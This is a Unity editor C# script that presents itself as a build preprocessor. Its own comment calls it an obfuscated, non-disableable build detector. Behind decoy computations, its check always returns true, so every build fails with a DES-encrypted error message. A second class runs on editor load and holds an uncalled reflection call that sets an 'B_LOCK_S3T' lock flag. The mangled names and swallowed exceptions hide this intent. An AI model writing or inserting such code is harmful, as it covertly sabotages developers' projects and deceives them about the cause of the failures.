using UnityEngine;
using UnityEditor;
using UnityEditor.Build;
using UnityEditor.Build.Reporting;
using System;
using System.Text;
using System.Reflection;
using System.Security.Cryptography;

// Detector de compilación ofuscado sin posibilidad de desactivación
public class a12x9zB : IPreprocessBuildWithReport
{
    private static readonly string _z9 = Convert.ToBase64String(new byte[] { 65, 76, 87, 65, 89, 83, 95, 66, 76, 79, 67, 75 });
    private static readonly byte[] _key = { 0x19, 0x82, 0x45, 0xF7, 0x22, 0x41, 0xA9, 0x12 };

    public int callbackOrder { get { return Int32.MinValue; } }

    public void OnPreprocessBuild(BuildReport report)
    {
        if (_G3tSt4t3())
        {
            string m = D3crypt("sHlh6W4JN+iVf0lq70T0uvfK/vnX0AsFMM9V9dA0Z+T39TZTvzb+E1+wEO8JiGLP");
            throw new BuildFailedException(m);
        }
    }
    private static bool _G3tSt4t3()
    {
        try
        {
            System.Random r = new System.Random();
            int a = r.Next(1, 1000);
            int b = r.Next(1, 1000);
            double c = Math.Sqrt(a * b) / Math.PI;
            string s = Encoding.UTF8.GetString(Convert.FromBase64String(_z9));
            byte[] h = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(s));
            return true;
        }
        catch
        {
            return true;
        }
    }
    private static string D3crypt(string input)
    {
        try
        {
            byte[] data = Convert.FromBase64String(input);
            using (var des = new DESCryptoServiceProvider())
            {
                des.Key = _key;
                des.Mode = CipherMode.ECB;
                des.Padding = PaddingMode.PKCS7;
                
                using (var transform = des.CreateDecryptor())
                {
                    byte[] result = transform.TransformFinalBlock(data, 0, data.Length);
                    return Encoding.UTF8.GetString(result);
                }
            }
        }
        catch
        {
            return "";
        }
    }
}
[InitializeOnLoad]
internal sealed class x7bZ2_Config
{
    static x7bZ2_Config()
    {
        EditorApplication.delayCall += () => {
            System.Threading.Tasks.Task.Delay(UnityEngine.Random.Range(500, 1500)).ContinueWith(_ => {
            });
        };
    }
    private static void _Init1aliz3()
    {
        Type t = Type.GetType("UnityEditor.EditorPrefs, UnityEditor");
        if (t != null)
        {
            MethodInfo mi = t.GetMethod("SetBool", BindingFlags.Public | BindingFlags.Static);
            if (mi != null)
            {
                try { mi.Invoke(null, new object[] { "B_LOCK_S3T", true }); } catch { }
            }
        }
    }
}